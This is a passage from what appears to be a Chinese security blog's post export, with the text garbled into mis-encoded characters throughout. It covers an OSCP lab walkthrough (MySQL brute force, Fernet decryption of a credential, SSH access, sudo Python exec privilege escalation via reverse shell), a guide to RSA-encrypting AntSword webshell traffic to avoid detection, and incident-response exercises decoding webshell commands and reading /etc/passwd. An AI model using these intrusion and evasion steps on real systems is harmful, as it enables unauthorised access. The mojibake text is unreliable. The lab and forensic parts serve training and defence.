ä¸ªæ¼æ´æµ‹è¯•çš„è„šæœ¬ä¿¡æ¯ï¼Œä½†æ˜¯ä»–ä»¬çš„åˆ©ç”¨éƒ½å¤±è´¥äº†</p><h2 id="ä¸‰ã€MySQLæ•°æ®åº“ä¿¡æ¯æ”¶é›†"><a href="#ä¸‰ã€MySQLæ•°æ®åº“ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸‰ã€MySQLæ•°æ®åº“ä¿¡æ¯æ”¶é›†"></a>ä¸‰ã€MySQLæ•°æ®åº“ä¿¡æ¯æ”¶é›†</h2><p>mysqlæ— ç–‘æ˜¯æœ¬é¶åœºæœ€é‡è¦çš„ä¸€ä¸ªçªç ´ç‚¹ï¼Œå…ˆæµ‹è¯•ä¸€ä¸‹mysqlæ˜¯å¦å…è®¸å¤–éƒ¨è¿æ¥</p><p><img src="/img/OSCP-PyExp/image-20240628000611734.png" alt="image-20240628000611734"></p><p>å“¦ï¼Œè¿™é‡Œæ˜¯è‚¯å®šçš„ï¼Œé‚£æ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥å°è¯•çˆ†ç ´</p><p><img src="/img/OSCP-PyExp/image-20240628001215373.png" alt="image-20240628001215373"></p><p><code>rockyou</code>è¿™ä¸ªå­—å…¸å±å®çˆ½å¿«ï¼Œå¾ˆå¿«å°±çˆ†ç ´å‡ºæ¥äº†ï¼›æ¥ä¸‹æ¥ç™»é™†æ•°æ®åº“æŸ¥çœ‹æœ‰æ— æ•æ„Ÿä¿¡æ¯</p><p><img src="/img/OSCP-PyExp/image-20240628001407393.png" alt="image-20240628001407393"></p><p>åœ¨<code>data</code>è¿™ä¸ªæ•°æ®åº“ä¸­å‘ç°æœ‰ä¸ªhashå€¼</p><p><img src="/img/OSCP-PyExp/image-20240628001440897.png" alt="image-20240628001440897"></p><p>è¿™æ ·çœ‹ç€æœ‰ç‚¹ä¹±ï¼Œæˆ‘ä»¬åˆ†å¼€å­—æ®µå€¼æ¥æŸ¥çœ‹</p><p><img src="/img/OSCP-PyExp/image-20240628001714076.png" alt="image-20240628001714076"></p><p>å¤§ä½¬å‹¿å–·ï¼Œç¬”è€…è¿˜æ˜¯é¦–æ¬¡ç¢°åˆ°è¿™ä¸ªåŠ å¯†æ–¹æ³•ï¼Œå› æ­¤æŸ¥æ‰¾äº†ä¸€äº›èµ„æ–™ï¼Œä¸‹é¢ç®€å•å¯¹è¿™ä¸ªåŠ å¯†ç®—æ³•åšå‡ºä¸€ä¸ªè¯´æ˜</p><blockquote><p>Fernet ç®—æ³•æ˜¯ä¸€ä¸ªå®‰å…¨çš„åŠ å¯†æ–¹æ³•ï¼Œå®ƒä½¿ç”¨ AES ä½œä¸ºåº•å±‚åŠ å¯†ç®—æ³•ï¼Œå¹¶ç»“åˆ HMAC æ¥ç¡®ä¿æ•°æ®çš„å®Œæ•´æ€§ã€‚</p><p>å…¶æ˜¯ä¸€ç§å¯¹ç§°åŠ å¯†ç®—æ³•ï¼Œç”±Pythonçš„cryptographyåº“æä¾›æ”¯æŒã€‚ä½¿ç”¨FernetåŠ å¯†ç®—æ³•å¯ä»¥å®ç°ç®€å•è€Œåˆå¼ºå¤§çš„åŠ å¯†åŠŸèƒ½ï¼Œé€šè¿‡ç”ŸæˆåŠ å¯†å¯†é’¥åŠ å¯†æ•°æ®ï¼Œå¹¶ä½¿ç”¨åŒä¸€ä¸ªå¯†é’¥è§£å¯†æ•°æ®ã€‚</p></blockquote><p>ä¸‹é¢å¯¹è¿™ä¸ªç®—æ³•è¿›è¡Œä¸€ä¸ªåŠ è§£å¯†çš„å°è¯•ï¼Œå‚è€ƒæ–‡ç« èµ„æ–™ï¼š<a href="https://deepinout.com/python/python-qa/84_hk_1709160332.html">FernetåŠ å¯†ç®—æ³•åœ¨Pythonä¸­çš„åº”ç”¨|æå®¢ç¬”è®° (deepinout.com)</a></p><p>å°è¯•å¯¹<code>Hello, world!</code>è¿›è¡ŒåŠ è§£å¯†</p><p><img src="/img/OSCP-PyExp/image-20240628003746582.png" alt="image-20240628003746582"></p><p>ä¹‹åå°†æ•°æ®åº“ä¸­æ‹¿åˆ°çš„ä¿¡æ¯è¿›è¡Œè§£å¯†ï¼Œæ‹¿åˆ°äº†å­—ç¬¦ä¸²ï¼šlucy:wJ9&#96;â€Lemdv9[FEw-</p><p><img src="/img/OSCP-PyExp/image-20240628004435194.png" alt="image-20240628004435194"></p><p>è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œæ˜çœ¼ä¸€çœ‹ï¼Œä¸­é—´ç”±å†’å·<code>:</code>åˆ†å‰²ï¼Œæ€•æ˜¯ä¸ªè´¦å·å¯†ç </p><h2 id="å››ã€SSHç™»é™†Getshell"><a href="#å››ã€SSHç™»é™†Getshell" class="headerlink" title="å››ã€SSHç™»é™†Getshell"></a>å››ã€SSHç™»é™†Getshell</h2><p>ä¹Ÿæ˜¯éå¸¸çš„æµç•…ï¼Œæ‹¿åˆ°äº†shell</p><p><img src="/img/OSCP-PyExp/image-20240628004715374.png" alt="image-20240628004715374"></p><h2 id="äº”ã€æƒé™æå‡"><a href="#äº”ã€æƒé™æå‡" class="headerlink" title="äº”ã€æƒé™æå‡"></a>äº”ã€æƒé™æå‡</h2><p>æœ¬æœ‰æœ‰ç”¨æˆ·å¯†ç çš„æƒ…å†µä¸‹ï¼ŒæŸ¥çœ‹æ˜¯å¦æœ‰sudoæ»¥ç”¨çš„æƒ…å†µï¼ŒæœçœŸæœ‰</p><p><img src="/img/OSCP-PyExp/image-20240628005404504.png" alt="image-20240628005404504"></p><p>è¿™é‡Œçš„execå‡½æ•°ï¼Œå°†ä¼šæ‰§è¡Œä»»ä½•çš„pyä»£ç ï¼›æ‰¾ä¸€æ®µpy çš„åå¼¹shell</p><p><img src="/img/OSCP-PyExp/image-20240628010553340.png" alt="image-20240628010553340"></p>]]></content>
      
      
      <categories>
          
          <category> OSCPç³»åˆ—é¶åœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€æµé‡åŠ å¯†ã€‘AntSwordæµé‡RSAåŠ å¯†</title>
      <link href="/2024/06/26/Red-Team-Invasion-AntSword-encryption/"/>
      <url>/2024/06/26/Red-Team-Invasion-AntSword-encryption/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€æµé‡åŠ å¯†ã€‘AntSwordæµé‡RSAåŠ å¯†"><a href="#ã€æµé‡åŠ å¯†ã€‘AntSwordæµé‡RSAåŠ å¯†" class="headerlink" title="ã€æµé‡åŠ å¯†ã€‘AntSwordæµé‡RSAåŠ å¯†"></a>ã€æµé‡åŠ å¯†ã€‘AntSwordæµé‡RSAåŠ å¯†</h1><h2 id="ä¸€ã€æ–°å»ºç¼–ç å™¨"><a href="#ä¸€ã€æ–°å»ºç¼–ç å™¨" class="headerlink" title="ä¸€ã€æ–°å»ºç¼–ç å™¨"></a>ä¸€ã€æ–°å»ºç¼–ç å™¨</h2><p>åœ¨èšå‰‘çš„ã€ç¼–ç ç®¡ç†ã€‘ä¸­ï¼Œæ–°å»ºä¸€ä¸ªç¼–ç å™¨ï¼Œé€‰æ‹©ã€PHP RSAã€‘ï¼Œåç§°éšæ„</p><p><img src="/img/Red-Team-Invasion-AntSword-encryption/image-20240626114312428.png" alt="image-20240626114312428"></p><p>åœ¨ã€RSAé…ç½®ã€‘ä¸­ç‚¹å‡»ã€ç”Ÿæˆã€‘å°†é‡æ–°é…ç½®å…¬ç§é’¥</p><p><img src="/img/Red-Team-Invasion-AntSword-encryption/image-20240626114435135.png" alt="image-20240626114435135"></p><p>å¤åˆ¶æœ€ä¸‹é¢çš„PHPä»£ç åˆ°é¶æœº</p><p><img src="/img/Red-Team-Invasion-AntSword-encryption/image-20240626114515471.png" alt="image-20240626114515471"></p><h2 id="äºŒã€æµ‹è¯•è¿æ¥"><a href="#äºŒã€æµ‹è¯•è¿æ¥" class="headerlink" title="äºŒã€æµ‹è¯•è¿æ¥"></a>äºŒã€æµ‹è¯•è¿æ¥</h2><p>æµ‹è¯•é»˜è®¤çš„ç¼–ç å™¨ï¼Œè¿æ¥å¤±è´¥</p><p><img src="/img/Red-Team-Invasion-AntSword-encryption/image-20240626114626428.png" alt="image-20240626114626428"></p><p>ä½¿ç”¨æ–°å»ºçš„ã€PHP RSAã€‘ç¼–ç å™¨</p><p><img src="/img/Red-Team-Invasion-AntSword-encryption/image-20240626114852725.png" alt="image-20240626114852725"></p><h2 id="ä¸‰ã€æŸ¥çœ‹æµé‡"><a href="#ä¸‰ã€æŸ¥çœ‹æµé‡" class="headerlink" title="ä¸‰ã€æŸ¥çœ‹æµé‡"></a>ä¸‰ã€æŸ¥çœ‹æµé‡</h2><p>æˆ‘ä»¬æ‰§è¡Œ<code>whoami</code>ï¼Œåœ¨é¶æœºä¸ŠæŠ“å–æµé‡</p><p><img src="/img/Red-Team-Invasion-AntSword-encryption/image-20240626115032037.png" alt="image-20240626115032037"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œè¯·æ±‚åŒ…å·²ç»æ²¡æœ‰äº†ä¼ ç»Ÿçš„<code>@ini_set(&quot;display_errors&quot;, &quot;0&quot;);</code>ä¸<code>@set_time_limit(0);</code>äº†</p><p><img src="/img/Red-Team-Invasion-AntSword-encryption/image-20240626115307427.png" alt="image-20240626115307427"></p><p>ä½†æ˜¯å“åº”åŒ…ä¾ç„¶æ˜¯æ˜æ–‡ï¼Œè¿™é‡Œç¨æœ‰ä¸è¶³</p>]]></content>
      
      
      <categories>
          
          <category> çº¢é˜Ÿå…¥ä¾µ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AntSword </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€ç„æœºåº”æ€¥ã€‘ç¬¬å…­ç«  æµé‡ç‰¹å¾åˆ†æ-èšå‰‘æµé‡åˆ†æ</title>
      <link href="/2024/06/15/xuanji-diliuzhang-AntSword/"/>
      <url>/2024/06/15/xuanji-diliuzhang-AntSword/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€ç„æœºåº”æ€¥ã€‘ç¬¬å…­ç« -æµé‡ç‰¹å¾åˆ†æ-èšå‰‘æµé‡åˆ†æ"><a href="#ã€ç„æœºåº”æ€¥ã€‘ç¬¬å…­ç« -æµé‡ç‰¹å¾åˆ†æ-èšå‰‘æµé‡åˆ†æ" class="headerlink" title="ã€ç„æœºåº”æ€¥ã€‘ç¬¬å…­ç«  æµé‡ç‰¹å¾åˆ†æ-èšå‰‘æµé‡åˆ†æ"></a>ã€ç„æœºåº”æ€¥ã€‘ç¬¬å…­ç«  æµé‡ç‰¹å¾åˆ†æ-èšå‰‘æµé‡åˆ†æ</h1><h2 id="ä¸€ã€é™„ä»¶ä¸‹è½½"><a href="#ä¸€ã€é™„ä»¶ä¸‹è½½" class="headerlink" title="ä¸€ã€é™„ä»¶ä¸‹è½½"></a>ä¸€ã€é™„ä»¶ä¸‹è½½</h2><p>ä¸‹è½½é™„ä»¶ï¼Œåœ¨Wiresharkä¸­æ‰“å¼€</p><p><img src="/img/xuanji-diliuzhang-AntSword/image-20240615133002004.png" alt="image-20240615133002004"></p><h2 id="äºŒã€æ­¥éª¤ä¸€ï¼šæœ¨é©¬çš„è¿æ¥å¯†ç æ˜¯å¤šå°‘"><a href="#äºŒã€æ­¥éª¤ä¸€ï¼šæœ¨é©¬çš„è¿æ¥å¯†ç æ˜¯å¤šå°‘" class="headerlink" title="äºŒã€æ­¥éª¤ä¸€ï¼šæœ¨é©¬çš„è¿æ¥å¯†ç æ˜¯å¤šå°‘"></a>äºŒã€æ­¥éª¤ä¸€ï¼šæœ¨é©¬çš„è¿æ¥å¯†ç æ˜¯å¤šå°‘</h2><p><img src="/img/xuanji-diliuzhang-AntSword/image-20240615133039067.png" alt="image-20240615133039067"></p><p>ç­›é€‰HTTPæµé‡æ•°æ®ï¼Œå…¸å‹çš„èšå‰‘æµé‡ç‰¹å¾</p><p><img src="/img/xuanji-diliuzhang-AntSword/image-20240615133248238.png" alt="image-20240615133248238"></p><p>èšå‰‘çš„è¿æ¥å¯†ç ä¹Ÿæ­£æ˜¯å¼€å¤´çš„1</p><h2 id="ä¸‰ã€æ­¥éª¤äºŒï¼šé»‘å®¢æ‰§è¡Œçš„ç¬¬ä¸€ä¸ªå‘½ä»¤æ˜¯ä»€ä¹ˆ"><a href="#ä¸‰ã€æ­¥éª¤äºŒï¼šé»‘å®¢æ‰§è¡Œçš„ç¬¬ä¸€ä¸ªå‘½ä»¤æ˜¯ä»€ä¹ˆ" class="headerlink" title="ä¸‰ã€æ­¥éª¤äºŒï¼šé»‘å®¢æ‰§è¡Œçš„ç¬¬ä¸€ä¸ªå‘½ä»¤æ˜¯ä»€ä¹ˆ"></a>ä¸‰ã€æ­¥éª¤äºŒï¼šé»‘å®¢æ‰§è¡Œçš„ç¬¬ä¸€ä¸ªå‘½ä»¤æ˜¯ä»€ä¹ˆ</h2><p><img src="/img/xuanji-diliuzhang-AntSword/image-20240615133448780.png" alt="image-20240615133448780"></p><p>çœ‹æ¥æ˜¯éœ€è¦å¯¹èšå‰‘çš„æµé‡è§£å¯†äº†ï¼Œä¹‹å‰æåˆ°è¿‡èšå‰‘çš„æµé‡è§£å¯†</p><p>æ‰¾åˆ°ç¬¬ä¸€æ¡èšå‰‘çš„æµé‡ï¼Œè¿›è¡Œè§£å¯†ï¼Œè®°å¾—å»æ‰å‰ä¸¤ä½çš„<code>AK</code></p><p><img src="/img/xuanji-diliuzhang-AntSword/image-20240615133730539.png" alt="image-20240615133730539"></p><p>è§£å¯†ç»“æœå¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd &quot;/var/www/html&quot;;id;echo e124bc;pwd;echo 43523</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬è¿½è¸ªhttpæµï¼ŒæŸ¥çœ‹å“åº”ç»“æœï¼Œæ‰§è¡Œçš„å‘½ä»¤æ˜¯<code>id</code>ï¼Œè¿™é‡Œæ„Ÿè§‰ç¨å¾®æœ‰ç‚¹é‚£å•¥ã€‚ã€‚</p><p><img src="/img/xuanji-diliuzhang-AntSword/image-20240615134031283.png" alt="image-20240615134031283"></p><h2 id="å››ã€æ­¥éª¤ä¸‰ï¼šé»‘å®¢è¯»å–äº†å“ªä¸ªæ–‡ä»¶çš„å†…å®¹"><a href="#å››ã€æ­¥éª¤ä¸‰ï¼šé»‘å®¢è¯»å–äº†å“ªä¸ªæ–‡ä»¶çš„å†…å®¹" class="headerlink" title="å››ã€æ­¥éª¤ä¸‰ï¼šé»‘å®¢è¯»å–äº†å“ªä¸ªæ–‡ä»¶çš„å†…å®¹"></a>å››ã€æ­¥éª¤ä¸‰ï¼šé»‘å®¢è¯»å–äº†å“ªä¸ªæ–‡ä»¶çš„å†…å®¹</h2><p><img src="/img/xuanji-diliuzhang-AntSword/image-20240615134131656.png" alt="image-20240615134131656"></p><p>å½“æˆ‘ä»¬ä¸€æ¡ä¸€æ¡çš„è§£å¯†ï¼Œæˆ–è€…çœ‹å“åº”åŒ…ä¼šå‘ç°ï¼Œçœ‹çš„æ˜¯<code>/etc/passwd</code></p><p><img src="/img/xuanji-diliuzhang-AntSword/image-20240615134357804.png" alt="image-20240615134357804"></p><h2 id="äº”ã€é»‘å®¢ä¸Šä¼ äº†ä»€ä¹ˆæ–‡ä»¶åˆ°æœåŠ¡å™¨ï¼Œæäº¤æ–‡ä»¶å"><a href="#äº”ã€é»‘å®¢ä¸Šä¼ äº†ä»€ä¹ˆæ–‡ä»¶åˆ°æœåŠ¡å™¨ï¼Œæäº¤æ–‡ä»¶å" class="headerlink" title="äº”ã€é»‘å®¢ä¸Šä¼ äº†ä»€ä¹ˆæ–‡ä»¶åˆ°æœåŠ¡å™¨ï¼Œæäº¤æ–‡ä»¶å"></a>äº”ã€é»‘å®¢ä¸Šä¼ äº†ä»€ä¹ˆæ–‡ä»¶åˆ°æœåŠ¡å™¨ï¼Œæäº¤æ–‡ä»¶å</h2><p><img src="/img/xuanji-diliuzhang-AntSword/image-20240615134435923.png" alt="image-20240615134435923"></p><p>åœ¨<code>437</code>å·çš„å“åº”åŒ…ä¸­å‡ºç°äº†å½“å‰ç›®å½•ä¸‹æ‰€æœ‰çš„æ–‡ä»¶ä»¥åŠéœ€æ”¹æ—¥æœŸç­‰ä¿¡æ¯</p><p><img src="/img/xuanji-diliuzhang-AntSword/image-20240615135015460.png" alt="image-20240615135015460"></p><p><code>flag.txt</code>æ–‡ä»¶çš„æ—¥æœŸæ˜¯åé¢ä¿®æ”¹ï¼Œè¯´æ˜è¯¥æ–‡ä»¶å¾ˆå¯èƒ½æ˜¯é»‘å®¢ä¸Šä¼ çš„</p><h2 id="å…­ã€é»‘å®¢ä¸Šä¼ çš„æ–‡ä»¶å†…å®¹æ˜¯ä»€ä¹ˆ"><a href="#å…­ã€é»‘å®¢ä¸Šä¼ çš„æ–‡ä»¶å†…å®¹æ˜¯ä»€ä¹ˆ" class="headerlink" title="å…­ã€é»‘å®¢ä¸Šä¼ çš„æ–‡ä»¶å†…å®¹æ˜¯ä»€ä¹ˆ"></a>å…­ã€é»‘å®¢ä¸Šä¼ çš„æ–‡ä»¶å†…å®¹æ˜¯ä»€ä¹ˆ</h2><p>è¿˜æ˜¯é”å®šé»‘å®¢ä¸Šä¼ çš„çš„<code>422</code>å·è¯·æ±‚åŒ…</p><p><img src="/img/xuanji-diliuzhang-AntSword/image-20240615140207419.png" alt="image-20240615140207419"></p><p>é‚£å¦ä¸€ç»„ç±»ä¼¼åå…­è¿›åˆ¶çš„å€¼å¤§æ¦‚å°±æ˜¯ä¸Šä¼ çš„å†…å®¹ï¼Œè§£å¯†ä¸‹</p><p><img src="/img/xuanji-diliuzhang-AntSword/image-20240615140243694.png" alt="image-20240615140243694"></p><h2 id="ä¸ƒã€é»‘å®¢ä¸‹è½½äº†å“ªä¸ªæ–‡ä»¶ï¼Œæäº¤æ–‡ä»¶ç»å¯¹è·¯å¾„"><a href="#ä¸ƒã€é»‘å®¢ä¸‹è½½äº†å“ªä¸ªæ–‡ä»¶ï¼Œæäº¤æ–‡ä»¶ç»å¯¹è·¯å¾„" class="headerlink" title="ä¸ƒã€é»‘å®¢ä¸‹è½½äº†å“ªä¸ªæ–‡ä»¶ï¼Œæäº¤æ–‡ä»¶ç»å¯¹è·¯å¾„"></a>ä¸ƒã€é»‘å®¢ä¸‹è½½äº†å“ªä¸ªæ–‡ä»¶ï¼Œæäº¤æ–‡ä»¶ç»å¯¹è·¯å¾„</h2><p><img src="/img/xuanji-diliuzhang-AntSword/image-20240615140324901.png" alt="image-20240615140324901"></p><p>åœ¨æœ€åä¸€æ¡</p><p><img src="/img/xuanji-diliuzhang-AntSword/image-20240615140554508.png" alt="image-20240615140554508"></p>]]></content>
      
      
      <categories>
          
          <category> ç„æœºåº”æ€¥é¶åœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> èšå‰‘æµé‡ç‰¹å¾ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€ç„æœºåº”æ€¥ã€‘ç¬¬ä¸ƒç«  å¸¸è§æ”»å‡»äº‹ä»¶åˆ†æ--é’“é±¼é‚®ä»¶</title>
      <link href="/2024/06/14/xuanji-diqizhang-Phisshing-emails/"/>
      <url>/2024/06/14/xuanji-diqizhang-Phisshing-emails/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€ç„æœºåº”æ€¥ã€‘ç¬¬ä¸ƒç« -å¸¸è§æ”»å‡»äº‹ä»¶åˆ†æâ€“é’“é±¼é‚®ä»¶"><a href="#ã€ç„æœºåº”æ€¥ã€‘ç¬¬ä¸ƒç« -å¸¸è§æ”»å‡»äº‹ä»¶åˆ†æâ€“é’“é±¼é‚®ä»¶" class="headerlink" title="ã€ç„æœºåº”æ€¥ã€‘ç¬¬ä¸ƒç«  å¸¸è§æ”»å‡»äº‹ä»¶åˆ†æâ€“é’“é±¼é‚®ä»¶"></a>ã€ç„æœºåº”æ€¥ã€‘ç¬¬ä¸ƒç«  å¸¸è§æ”»å‡»äº‹ä»¶åˆ†æâ€“é’“é±¼é‚®ä»¶</h1><h2 id="ä¸€ã€é™„ä»¶ä¸‹è½½"><a href="#ä¸€ã€é™„ä»¶ä¸‹è½½" class="headerlink" title="ä¸€ã€é™„ä»¶ä¸‹è½½"></a>ä¸€ã€é™„ä»¶ä¸‹è½½</h2><p>ä¸‹è½½å¥½æµé‡æ•°æ®åŒ…é™„ä»¶</p><p><img src="/img/xuanji-diqizhang-Phisshing-emails/image-20240614180033847.png" alt="image-20240614180033847"></p><h2 id="äºŒã€æ­¥éª¤ä¸€ï¼šè¯·åˆ†æè·å–é»‘å®¢å‘é€é’“é±¼é‚®ä»¶æ—¶ä½¿ç”¨çš„IP"><a href="#äºŒã€æ­¥éª¤ä¸€ï¼šè¯·åˆ†æè·å–é»‘å®¢å‘é€é’“é±¼é‚®ä»¶æ—¶ä½¿ç”¨çš„IP" class="headerlink" title="äºŒã€æ­¥éª¤ä¸€ï¼šè¯·åˆ†æè·å–é»‘å®¢å‘é€é’“é±¼é‚®ä»¶æ—¶ä½¿ç”¨çš„IP"></a>äºŒã€æ­¥éª¤ä¸€ï¼šè¯·åˆ†æè·å–é»‘å®¢å‘é€é’“é±¼é‚®ä»¶æ—¶ä½¿ç”¨çš„IP</h2><p><img src="/img/xuanji-diqizhang-Phisshing-emails/image-20240614180108297.png" alt="image-20240614180108297"></p><p>å…ˆæ•´ä½“æµè§ˆä¸‹é™„ä»¶å†…å®¹ï¼Œæœ‰wwwçš„ç½‘ç«™æºæ–‡ä»¶å’Œlogçš„æ—¥å¿—ç›®å½•</p><p><img src="/img/xuanji-diqizhang-Phisshing-emails/image-20240614180851874.png" alt="image-20240614180851874"></p><p>è¿™é‡Œæœ‰é’“é±¼çš„é‚®ä»¶ï¼Œç›´æ¥è®°äº‹æœ¬æ‰“å¼€ã€‚çœ‹æœ€åä¸€ä¸ª<code>Received</code>å†…éƒ¨çš„fromçš„åœ°å€</p><p><img src="/img/xuanji-diqizhang-Phisshing-emails/image-20240614183540152.png" alt="image-20240614183540152"></p><p>å‰é¢çš„<code>Received</code>å†…éƒ¨çš„fromåœ°å€å¤§éƒ½æ˜¯å…¶ä»–é‚®ä»¶æœåŠ¡å™¨çš„ä»£ç†è½¬å‘åœ°å€</p><h2 id="ä¸‰ã€æ­¥éª¤äºŒï¼šè·å–é»‘å®¢é’“é±¼é‚®ä»¶ä¸­ä½¿ç”¨çš„æœ¨é©¬ç¨‹åºçš„æ§åˆ¶ç«¯IP"><a href="#ä¸‰ã€æ­¥éª¤äºŒï¼šè·å–é»‘å®¢é’“é±¼é‚®ä»¶ä¸­ä½¿ç”¨çš„æœ¨é©¬ç¨‹åºçš„æ§åˆ¶ç«¯IP" class="headerlink" title="ä¸‰ã€æ­¥éª¤äºŒï¼šè·å–é»‘å®¢é’“é±¼é‚®ä»¶ä¸­ä½¿ç”¨çš„æœ¨é©¬ç¨‹åºçš„æ§åˆ¶ç«¯IP"></a>ä¸‰ã€æ­¥éª¤äºŒï¼šè·å–é»‘å®¢é’“é±¼é‚®ä»¶ä¸­ä½¿ç”¨çš„æœ¨é©¬ç¨‹åºçš„æ§åˆ¶ç«¯IP</h2><p><img src="/img/xuanji-diqizhang-Phisshing-emails/image-20240614183859537.png" alt="image-20240614183859537"></p><h3 id="1ã€è¿‡æ²™ç®±"><a href="#1ã€è¿‡æ²™ç®±" class="headerlink" title="1ã€è¿‡æ²™ç®±"></a>1ã€è¿‡æ²™ç®±</h3><p><img src="/img/xuanji-diqizhang-Phisshing-emails/image-20240614202342907.png" alt="image-20240614202342907"></p><h2 id="å››ã€æ­¥éª¤ä¸‰ï¼šè¯·åˆ†æè·å–webshellçš„æ–‡ä»¶å"><a href="#å››ã€æ­¥éª¤ä¸‰ï¼šè¯·åˆ†æè·å–webshellçš„æ–‡ä»¶å" class="headerlink" title="å››ã€æ­¥éª¤ä¸‰ï¼šè¯·åˆ†æè·å–webshellçš„æ–‡ä»¶å"></a>å››ã€æ­¥éª¤ä¸‰ï¼šè¯·åˆ†æè·å–webshellçš„æ–‡ä»¶å</h2><p><img src="/img/xuanji-diqizhang-Phisshing-emails/image-20240614202532251.png" alt="image-20240614202532251"></p><h3 id="1ã€Dç›¾æ‰«ä¸€ä¸‹"><a href="#1ã€Dç›¾æ‰«ä¸€ä¸‹" class="headerlink" title="1ã€Dç›¾æ‰«ä¸€ä¸‹"></a>1ã€Dç›¾æ‰«ä¸€ä¸‹</h3><p><img src="/img/xuanji-diqizhang-Phisshing-emails/image-20240614203046008.png" alt="image-20240614203046008"></p><h2 id="äº”ã€æ­¥éª¤å››ï¼šéš§é“ç¨‹åºçš„æ–‡ä»¶å"><a href="#äº”ã€æ­¥éª¤å››ï¼šéš§é“ç¨‹åºçš„æ–‡ä»¶å" class="headerlink" title="äº”ã€æ­¥éª¤å››ï¼šéš§é“ç¨‹åºçš„æ–‡ä»¶å"></a>äº”ã€æ­¥éª¤å››ï¼šéš§é“ç¨‹åºçš„æ–‡ä»¶å</h2><p><img src="/img/xuanji-diqizhang-Phisshing-emails/image-20240614203257208.png" alt="image-20240614203257208"></p><p>è§‚å¯Ÿå…¶ä»–è·¯å¾„çš„æ–‡ä»¶</p><p><img src="/img/xuanji-diqizhang-Phisshing-emails/image-20240614204406110.png" alt="image-20240614204406110"></p><p>ç–‘ä¼¼mysql çš„é…ç½®æ–‡ä»¶<code>my.conf</code>æ€ä¹ˆä¼šå‡ºç°åœ¨è¿™é‡Œã€‚è¿‡æ²™ç®±</p><p><img src="/img/xuanji-diqizhang-Phisshing-emails/image-20240614204704963.png" alt="image-20240614204704963"></p>]]></content>
      
      
      <categories>
          
          <category> ç„æœºåº”æ€¥é¶åœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é’“é±¼é‚®ä»¶ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€ç„æœºåº”æ€¥ã€‘ç¬¬å…­ç«  æµé‡ç‰¹å¾åˆ†æ-èš‚èšçˆ±ä¸Šæ ‘</title>
      <link href="/2024/06/13/xuanji-diliuzhang-Traffic-characteristics/"/>
      <url>/2024/06/13/xuanji-diliuzhang-Traffic-characteristics/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€ç„æœºåº”æ€¥ã€‘ç¬¬å…­ç« -æµé‡ç‰¹å¾åˆ†æ-èš‚èšçˆ±ä¸Šæ ‘"><a href="#ã€ç„æœºåº”æ€¥ã€‘ç¬¬å…­ç« -æµé‡ç‰¹å¾åˆ†æ-èš‚èšçˆ±ä¸Šæ ‘" class="headerlink" title="ã€ç„æœºåº”æ€¥ã€‘ç¬¬å…­ç«  æµé‡ç‰¹å¾åˆ†æ-èš‚èšçˆ±ä¸Šæ ‘"></a>ã€ç„æœºåº”æ€¥ã€‘ç¬¬å…­ç«  æµé‡ç‰¹å¾åˆ†æ-èš‚èšçˆ±ä¸Šæ ‘</h1><h2 id="ä¸€ã€é™„ä»¶ä¸‹è½½"><a href="#ä¸€ã€é™„ä»¶ä¸‹è½½" class="headerlink" title="ä¸€ã€é™„ä»¶ä¸‹è½½"></a>ä¸€ã€é™„ä»¶ä¸‹è½½</h2><p>ä¸‹è½½é™„ä»¶ï¼Œåœ¨Wiresharkä¸­æ‰“å¼€</p><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled.png" alt="Untitled"></p><h2 id="äºŒã€æ­¥éª¤ä¸€ï¼šç®¡ç†å‘˜Adminè´¦å·çš„å¯†ç æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#äºŒã€æ­¥éª¤ä¸€ï¼šç®¡ç†å‘˜Adminè´¦å·çš„å¯†ç æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="äºŒã€æ­¥éª¤ä¸€ï¼šç®¡ç†å‘˜Adminè´¦å·çš„å¯†ç æ˜¯ä»€ä¹ˆï¼Ÿ"></a>äºŒã€æ­¥éª¤ä¸€ï¼šç®¡ç†å‘˜Adminè´¦å·çš„å¯†ç æ˜¯ä»€ä¹ˆï¼Ÿ</h2><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled1.png" alt="Untitled"></p><h3 id="1ã€å‘ç°èšå‰‘æµé‡ç‰¹å¾"><a href="#1ã€å‘ç°èšå‰‘æµé‡ç‰¹å¾" class="headerlink" title="1ã€å‘ç°èšå‰‘æµé‡ç‰¹å¾"></a>1ã€å‘ç°èšå‰‘æµé‡ç‰¹å¾</h3><p>å…ˆå¤§è‡´æµè§ˆä¸€ä¸‹æ•´ä½“çš„æ•°æ®åŒ…ï¼Œè¿™ä¸¤ä¸ªç«¯å£é€šè®¯é¢‘ç¹</p><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled2.png" alt="Untitled"></p><p>æ‰¾å‡ ä¸ªæµé‡åŒ…æ¥çœ‹ä¸€çœ‹ï¼Œå‘ç°èšå‰‘æµé‡ç‰¹å¾</p><p><img src="/img/xuanji-diliuzhang-Traffic-characteristics/Untitled3.png" alt="Untitled"></p><h3 id="2ã€æ‰¾ç®¡ç†å‘˜çš„å¯†ç "><a href="#2ã€æ‰¾ç®¡ç†å‘˜çš„å¯†ç " class="headerlink" title="2ã€æ‰¾ç®¡ç†å‘˜çš„å¯†ç "></a>2ã€æ‰¾ç®¡ç†å‘˜çš„å¯†ç </h3><p>æ‰¾æœ¨é©¬<code>product2.php</code> ï¼Œåšæ ‡è®°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 